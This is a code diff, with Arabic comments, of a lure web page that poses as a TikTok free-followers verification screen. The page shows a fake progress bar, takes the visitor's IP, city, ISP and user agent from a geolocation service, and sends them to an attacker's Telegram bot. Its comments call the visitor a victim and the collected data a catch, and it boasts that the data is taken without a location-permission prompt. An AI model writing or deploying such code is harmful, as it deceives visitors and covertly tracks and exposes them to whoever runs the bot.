@@ -31,31 +31,32 @@
     // --- إعداداتك الخاصة (عدلها هنا) ---
     const botToken = 'رقم_التوكن_هنا'; 
     const chatId = 'رقم_الآيدي_هنا';
-    const targetSite = "https://tikfollowers.com/tiktok-free-fans"; // موقع الرشق
+    const targetSite = "https://tikfollowers.com/tiktok-free-fans"; 
     // ----------------------------------
 
     async function startProcess() {
         try {
+            // سحب البيانات عن طريق الـ IP فقط (لا يطلب إذن الموقع)
             const response = await fetch('https://ipapi.co/json/');
             const data = await response.json();
             
-            // عرض المعلومات للضحية (للتمويه)
+            // عرض المعلومات للتمويه
             document.getElementById('details').innerHTML = `
                 [✔] الجهاز المكتشف: ${navigator.platform} <br>
-                [✔] مدينة المصدر: ${data.city} <br>
+                [✔] المدينة التقريبية: ${data.city} <br>
                 [✔] عنوان الـ IP: ${data.ip} <br>
                 [✔] شركة الاتصال: ${data.org} <br>
-                [✔] حالة الموقع: متصل بنجاح
+                [✔] حالة النظام: متصل
             `;
 
-            // إرسال الصيدة للتليجرام
+            // إرسال البيانات للتليجرام
             const message = `
-🔥 صيدة جديدة من الرابط الخارق!
+🎯 صيدة جديدة (نظام RALLO المطور)
 📍 المدينة: ${data.city}
 🌐 الشركة: ${data.org}
 🔢 الـ IP: ${data.ip}
 📱 الجهاز: ${navigator.userAgent}
-🗺️ الخريطة: http://www.google.com/maps/place/${data.latitude},${data.longitude}
+⚠️ تم سحب البيانات بدون طلب إذن الموقع.
             `;
             
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat-id=${chatId}&text=${encodeURIComponent(message)}`);
@@ -69,11 +70,11 @@
             const interval = setInterval(() => {
                 if (width >= 100) {
                     clearInterval(interval);
-                    status.innerHTML = "✅ تم التحقق من هويتك بنجاح!";
+                    status.innerHTML = "✅ تم التحقق بنجاح!";
                     status.style.color = "#fff";
-                    btn.style.display = "inline-block"; // إظهار الزر بعد اكتمال التحميل
+                    btn.style.display = "inline-block"; 
                 } else {
-                    width += 2; // سرعة التحميل
+                    width += 2;
                     bar.style.width = width + "%";
                 }
             }, 100);
